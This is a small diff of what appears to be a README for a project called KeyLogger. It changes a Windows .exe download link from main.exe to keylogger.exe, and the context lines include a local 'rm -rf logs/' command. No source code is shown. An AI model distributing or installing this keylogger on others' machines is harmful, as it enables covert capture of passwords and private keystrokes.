@@ -73,7 +73,7 @@ $ sudo rm -rf logs/
 
 # Download the .exe for Windows 10/11
 
-[Download](https://github.com/bruhpate/KeyLogger/raw/main/scripts/main.exe)
+[Download](https://github.com/bruhpate/KeyLogger/raw/main/scripts/keylogger.exe)
 
 # External libraries used:
 
